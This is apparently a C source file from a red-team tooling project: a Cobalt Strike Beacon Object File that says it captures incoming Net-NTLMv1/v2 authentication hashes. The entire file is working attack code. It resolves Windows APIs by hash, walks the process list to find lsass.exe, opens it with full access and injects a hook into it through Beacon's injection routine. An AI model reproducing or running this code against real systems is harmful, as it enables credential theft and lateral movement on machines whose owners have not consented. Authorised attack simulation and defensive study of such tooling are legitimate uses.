/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

/**
 *
 * @brief:	Searches for Lsa and injects itself.
 *
 * @param:	Pointer to the virtual method table.
 * @param:	Argument array from Cobalt Strike.
 * @param:	Argument length from Cobalt Strike.
 *
**/
D_SEC( A ) VOID WINAPI BofMain( _In_ PBAPI_TABLE BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) 
{
	INT		Len = 0;
	ULONG		Pid = 0;
	PCHAR		Str = NULL;
	HANDLE		Prc = NULL;
	HANDLE		Snp = NULL;

	API		Api;
	DATAP		Psr;
	PROCESSENTRY32	Ent;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Ent, sizeof( Ent ) );

	BeaconApi->BeaconDataParse( &Psr, Argv, Argc );
	Str = BeaconApi->BeaconDataExtract( &Psr, &Len );

	Api.CreateToolhelp32Snapshot = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_CREATETOOLHELP32SNAPSHOT );
	Api.Process32First           = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_PROCESS32FIRST );
	Api.Process32Next            = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_PROCESS32NEXT );
	Api.CloseHandle              = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_CLOSEHANDLE );
	Api.OpenProcess              = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_OPENPROCESS );

	/* Create a snapshot of all active process's to get the PID of Lsa */
	if ( ( Snp = Api.CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ) ) != INVALID_HANDLE_VALUE ) {

		Ent.dwSize = sizeof( Ent );

		/* Extract first entry */
		if ( Api.Process32First( Snp, &Ent ) ) {
			do
			{
				/* Is Lsa? Continue! */
				if ( HashString( Ent.szExeFile, 0 ) == H_STR_LSASS ) {
					/* Open the process for injection! */
					if ( ( Prc = Api.OpenProcess( PROCESS_ALL_ACCESS, FALSE, Ent.th32ProcessID ) ) != NULL ) {
						BeaconApi->BeaconInjectProcess( Prc, 
								                Ent.th32ProcessID, 
										C_PTR( G_PTR( InstallHook ) ),
										U_PTR( U_PTR( G_END( ) ) - U_PTR( G_PTR( InstallHook ) ) ),
										0,
										Str,
										Len ); Api.CloseHandle( Prc );
					} else {
						/* Could not open :( */
						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_PTR( "[NetNtLmCaptureBof]: Could not open the process :(" ) ) );
					};
					break;
				};
			} while ( Api.Process32Next( Snp, &Ent ) );
		};
		Api.CloseHandle( Snp );
	};
};
